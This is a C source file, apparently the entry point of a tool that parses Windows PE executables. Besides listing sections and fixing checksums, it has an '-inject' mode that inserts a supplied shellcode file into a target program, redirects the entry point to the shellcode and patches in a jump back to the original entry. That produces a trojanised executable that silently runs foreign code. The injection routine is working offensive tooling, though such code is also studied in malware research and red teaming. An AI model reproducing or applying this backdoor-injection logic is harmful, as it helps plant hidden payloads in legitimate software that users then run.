#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "../lib/custom_io.h"
#include "../lib/inject.h"
#include "../lib/map.h"
#include "../lib/PE.h"
#include "../lib/DOS.h"
#include "../lib/custom_io_pe.h"

char *target;
char *shellcode;
char *output;

int main(int argc , char **argv){
	basic_map *args = mapCreate_fromParams(argc, argv);
	if(!args)
		return 1;

	if(_mapKeyExist(args, "-showSections")){
		PE_STRUCTURE *pe = loadPE(mapKeyLookup(args, "-target"));
		vVector *sections = getSections(pe);
		for(size_t i = 0 ; i < sections->size ; i++){
			struct _IMAGE_SECTION_HEADER *section = vVector_at(sections, i);
			printf("Name:\t%s\n\tStart:\t0x%X\n\tEnd:\t0x%X\n", section->name, section->virtualAddress,section->virtualAddress + section->Misc.virtualSize);

		}

		vVector_destroy(sections);
		free(pe->buffer);
		free(pe);
	}

	if(_mapKeyExist(args, "-showNT")){

	}

	if(_mapKeyExist(args, "-recheck")){
	PE_STRUCTURE *pe = loadPE(mapKeyLookup(args, "-target"));
	long chksum = pe_checksum(pe);
	printf("Target Checksum:\t0x%X\n",pe->image_nt_header->image_optional_header.checkSum);
	printf("Calculated Checksum:\t0x%lX\n",chksum);
	pe->image_nt_header->image_optional_header.checkSum = chksum;
	bufferToFile(pe->buffer, pe->size, mapKeyLookup(args, "-target"));
	free(pe->buffer);
	free(pe);
	mapDestroy(args);
	return 0;
	}

	if(_mapKeyExist(args, "-inject")){ //TODO: Proper cleanup.
		target = mapKeyLookup(args, "-target");
		shellcode = mapKeyLookup(args, "-shellcode");
		output = mapKeyLookup(args, "-output");

		printf("Target: %s\nShellcode: %s\nOutput: %s\n",target,shellcode,output);
		PE_STRUCTURE *pe = loadPE(mapKeyLookup(args, "-target"));
		struct _IMAGE_SECTION_HEADER **sections = pe_sections(pe);
		if(!sections)
			return 1;

		compound_file *cf_shellcode = fileToBuffer(mapKeyLookup(args, "-shellcode"));
		inject_data id;
		injectData(pe, sections, cf_shellcode,&id);
		printf("Shellcode is at %lx\n",id.position_in_memory);
		uint32_t oldEntry = pe->image_nt_header->image_optional_header.addressOfEntryPoint;
		printf("Old Entrypoint is at relative (%x) - raw (%x)\n", oldEntry, oldEntry + pe->image_nt_header->image_optional_header.imageBase);
		pe->image_nt_header->image_optional_header.addressOfEntryPoint = id.position_in_memory - pe->image_nt_header->image_optional_header.imageBase;
		printf("New Entrypoint is at %x\n",pe->image_nt_header->image_optional_header.addressOfEntryPoint);


		void *dst = pe->buffer + id.offset_in_file + cf_shellcode->size;
		printf("Patched re-entry at %lx\n",pe_map_buffer_to_memoryEx(pe, dst));
		*(unsigned char *)(dst) = 0xb8; //mov eax
		*(uint32_t *)(dst + 1 ) = oldEntry + pe->image_nt_header->image_optional_header.imageBase; //position in memory
		*(unsigned char *)(dst + 1 + sizeof(uint32_t)) =  0xff;
		*(unsigned char *)(dst + 1 + sizeof(uint32_t) + 1) =  0xd0;


		printf("value %x\n",oldEntry + pe->image_nt_header->image_optional_header.imageBase);
		bufferToFile(pe->buffer, pe->size, mapKeyLookup(args, "-output"));
		destroyCompoundFile(cf_shellcode);
		free(pe->buffer);
		free(pe);

		return 0;
	}

	mapDestroy(args);
	return 0;
}
